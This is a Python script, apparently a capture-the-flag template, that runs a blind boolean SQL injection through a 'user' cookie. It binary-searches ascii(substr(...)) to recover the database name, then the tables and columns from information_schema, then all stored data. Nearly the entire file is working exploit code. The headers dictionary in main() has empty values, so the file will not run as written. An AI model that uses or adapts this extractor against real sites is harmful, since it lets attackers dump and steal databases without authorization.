import requests
 
# index starts from 1, return Null if char DNE
def find_DB_char(url: str, header: dict, char: int):
    left = 0
    right = 126
    while left <= right:

        mid = (left + right) // 2

        # Query 
        # fix here
        cookie = {
        "user": f"Your name' and ascii(substr((SELECT database()), {char}, 1)) > {mid} and '1'='1",
        "PHPSESSID": "Your PHPSESSID"
        }

        response = requests.post(url,headers=header, cookies=cookie, allow_redirects=False)

        # fix here
        if 'Your Flag' in response.text:
            left = mid + 1
        else:
            right = mid - 1

    if left == 0:
        return None 
    else:
        return chr(left)
    
# index starts from 1, return Null if char DNE
def find_table_char(url: str, header: dict, idx: int, char: int, DB_name: str):
    left = 0
    right = 126
    while left <= right :

        mid = (left + right) // 2

        # Query
        cookie = {
        # fix here    
        "user": f"Your Name' and ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = '{DB_name}' LIMIT {idx},1), {char}, 1)) > {mid} and '1'='1",
        "PHPSESSID": "Your PHPSESSID"
        }

        response = requests.post(url,headers=header, cookies=cookie, allow_redirects=False)
        
        # fix here    
        if 'Your Flag' in response.text:
            left = mid + 1
        else:
            right = mid - 1

    if left == 0:
        return None 
    else:
        return chr(left)

# index starts from 1, return Null if char DNE
def find_column_char(url: str, header: dict, idx: int, char: int, table_name: str):
    left = 0
    right = 126
    while left <= right :

        mid = (left + right) // 2

        cookie = {
        # fix here    
        "user": f"Your Name' and ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}' LIMIT {idx},1), {char}, 1)) > {mid} and '1'='1",
        "PHPSESSID": "Your PHPSESSID"
        }

        response = requests.post(url,headers=header, cookies=cookie, allow_redirects=False)
        
        # fix here    
        if 'Your Flag' in response.text:
            left = mid + 1
        else:
            right = mid - 1
    
    if left == 0:
        return None 
    else:
        return chr(left)

# index starts from 1, return Null if char DNE
def find_data_char(url: str, header: dict, idx: int, char: int, column_name: str, table_name: str):
    left = 0
    right = 126                
    # find a letter
    while left <= right :

        mid = (left + right) // 2

        cookie = {
            # fix here    
            "user": f"Your Name' and ascii(substr((SELECT {column_name} FROM {table_name} LIMIT {idx},1), {char}, 1)) > {mid} and '1'='1",
            "PHPSESSID": "Your PHPSESSID"
            }

        response = requests.post(url, headers=header, cookies=cookie, allow_redirects=False)
        
        # fix here    
        if 'Flag' in response.text:
            left = mid + 1
        else:
            right = mid - 1
    
    if left == 0:
        return None 
    else:
        return chr(left)

def find_data(url, header):
    
    char_idx = 1
    DB_NAME = ""
    
    print("[*] start finding DB Name [*]")
    while True:
        char = find_DB_char(url, header, char_idx)
        
        if char is not None:
            DB_NAME += char 
            char_idx += 1
        else:
            print("[!] DB Name found:", DB_NAME, "[!]")
            break

    print("[*] Start finding tables [*]")
    
    def find_tables():
        Tables = []
        table_name =""
        idx = 0
        char_idx = 1
        while True:

            while True:
                char = find_table_char(url, header, idx, char_idx, DB_NAME)
                if char is not None:
                    table_name += char 
                    char_idx += 1
                elif table_name == "":
                    print("[*] No more tables [*]")
                    return Tables
                else:
                    Tables.append(table_name)
                    print(f"[!] {len(Tables)} table(s) found:", table_name, "[!]")
                    break

            idx += 1
            char_idx = 1
            table_name= ""
    tables = find_tables()

    print("[!] All tables are found:", tables, "[!]")
    print("[*] Start finding columns [*]")

    def find_columns(table_name):
        Columns = []
        column_name =""
        idx = 0
        char_idx = 1
        while True:

            while True:
                char = find_column_char(url, header, idx, char_idx, table_name)
                if char is not None:
                    column_name += char 
                    char_idx += 1
                elif column_name == "":
                    print("[*] No more columns [*]")
                    return Columns
                else:
                    Columns.append(column_name)
                    print(f"[!] {len(Columns)} column(s) found:", column_name, "[!]")
                    break

            idx += 1
            char_idx = 1
            column_name= ""

    # We have whole tables, and columns
    data_base = {}

    for table in tables:
        print(f"[*] In {table} table, columns are: [*]")
        data_base[table] = find_columns(table)
    
    print("[!] All columns are found:", data_base, "[!]")
    print("[*] Start finding all data [*]")

    def find_datas(table_name, column_name):
        data_name = ""
        data_set = []
        idx = 0
        char_idx = 1
        
        while True:
            while True:
                char = find_data_char(url, header, idx, char_idx, column_name, table_name)
                if char is not None:
                    data_name += char 
                    char_idx += 1
                elif data_name == "":
                    print(f"[*] No more data in {column_name} column in {table_name} table. [*]")
                    return data_set
                else:
                    data_set.append(data_name)
                    print(f"[!] {len(data_set)} data(s) found:", data_name, "[!]")
                    break
            
            idx += 1
            char_idx = 1
            data_name= ""
    
    DB = {}

    for table in data_base:
        DB[table] = {}
        for column in data_base[table]:
            print(f"[*] In table: {table}, column: {column}, datas are: [*]")
            DB[table][column] = []
            data = []
            data = find_datas(table, column)
            DB[table][column].append(data)
            print(f"[*] {data} is adding in {column} column, {table} table [*]")
    
    print(f"[!] All Database has extrated: {DB} [!]")

def main():

    #fix here
    url = "http:YOUR URL"

    #fix here
    headers = {
    "Accept-Language": ,
    "Upgrade-Insecure-Requests": ,
    "User-Agent": ,
    "Accept": ,
    "Referer": ,
    "Accept-Encoding": ,
    "Connection": 
    }

    find_data(url, headers)

if __name__ == "__main__":
    main()            